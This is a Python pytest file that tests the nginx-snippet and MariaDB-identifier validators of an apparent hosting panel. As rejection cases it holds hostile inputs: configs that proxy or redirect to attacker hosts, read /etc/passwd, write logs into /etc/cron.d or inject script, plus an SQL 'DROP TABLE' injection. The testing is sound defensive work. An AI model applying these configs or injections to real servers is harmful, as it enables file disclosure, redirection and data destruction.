"""Smoke tests for security-critical validators.

These run on Linux CI; do not rely on running them on Windows.
"""

import os
import sys
import pytest

# Force a deterministic config when imported in CI without an .env present.
os.environ.setdefault("APP_ENV", "development")
os.environ.setdefault("SECRET_KEY", "test-secret-key-for-unit-tests-only")
os.environ.setdefault("COMMAND_DRY_RUN", "true")

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ""))

from app.services.nginx import render_vhost, validate_custom_nginx, validate_full_nginx_config  # noqa: E402
from app.services.mariadb import _validate_identifier  # noqa: E402
from app.schemas.schemas import WebsiteCreate  # noqa: E402


class TestNginxCustomValidator:
    def test_rejects_server_block(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("server { listen 8080; }")

    def test_rejects_include(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("include /etc/passwd;")

    def test_rejects_proxy_pass(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("location /api { proxy_pass http://attacker.com; }")

    def test_rejects_upstream_at_name(self):
        # Nginx supports @-prefixed named upstreams: upstream @backend { ... }
        with pytest.raises(ValueError):
            validate_custom_nginx("upstream @backend { server attacker.com; }")

    def test_rejects_alias(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("location / { alias /etc/passwd; }")

    def test_rejects_root_directive(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("root /etc;")

    def test_rejects_access_log(self):
        with pytest.raises(ValueError):
            validate_custom_nginx('access_log /etc/cron.d/x "$request";')

    def test_rejects_error_log(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("error_log /etc/cron.d/x;")

    def test_rejects_load_module(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("load_module modules/ngx_http_evil_module.so;")

    def test_rejects_return_directive(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("return 302 https://attacker.example/;")

    def test_rejects_error_page(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("error_page 404 https://attacker.example/;")

    def test_rejects_rewrite(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("rewrite ^/(.*)$ /$1 last;")

    def test_rejects_add_header(self):
        # add_header lets a tenant override security headers (HSTS, CSP)
        # set by the panel; force them to use the dedicated UI instead.
        with pytest.raises(ValueError):
            validate_custom_nginx("add_header X-Foo bar;")

    def test_rejects_auth_request(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("auth_request /verify;")

    def test_rejects_sub_filter(self):
        with pytest.raises(ValueError):
            validate_custom_nginx('sub_filter "</body>" "<script>x</script></body>";')

    def test_rejects_try_files(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("try_files /etc/passwd =404;")

    def test_rejects_unbalanced_braces(self):
        with pytest.raises(ValueError):
            validate_custom_nginx("location / {")

    def test_accepts_safe_block(self):
        # Plain client_max_body_size is still allowed; it's a tunable that
        # cannot redirect, rewrite, or read files outside the site root.
        result = validate_custom_nginx("client_max_body_size 32m;")
        assert "client_max_body_size" in result

    def test_empty_is_ok(self):
        assert validate_custom_nginx("") == ""

    def test_full_config_accepts_server_block(self):
        assert "server" in validate_full_nginx_config("server { listen 80; }")

    def test_full_config_rejects_nul(self):
        with pytest.raises(ValueError):
            validate_full_nginx_config("server {\x00}")

    def test_php_app_renders_fastcgi(self):
        content = render_vhost("example.com", "/home/testuser/example.com", app_type="php", php_version="8.3")
        assert "fastcgi_pass" in content
        assert "wp-config.php" not in content


class TestWebsiteCreateSchema:
    def test_php_site_ignores_wordpress_admin_email(self):
        payload = WebsiteCreate(
            domain="example.com",
            app_type="php",
            install_wordpress=False,
            admin_email="admin@domain.com",
            admin_password="short",
        )

        assert payload.admin_email is None
        assert payload.admin_password is None


class TestMariaDBIdentifier:
    def test_rejects_sql_injection(self):
        with pytest.raises(ValueError):
            _validate_identifier("user; DROP TABLE users;--")

    def test_rejects_uppercase(self):
        with pytest.raises(ValueError):
            _validate_identifier("UPPER")

    def test_rejects_special_chars(self):
        for bad in ["a-b", "a b", "a$b", "a;b"]:
            with pytest.raises(ValueError):
                _validate_identifier(bad)

    def test_accepts_safe_identifier(self):
        assert _validate_identifier("wp_example_com") == "wp_example_com"
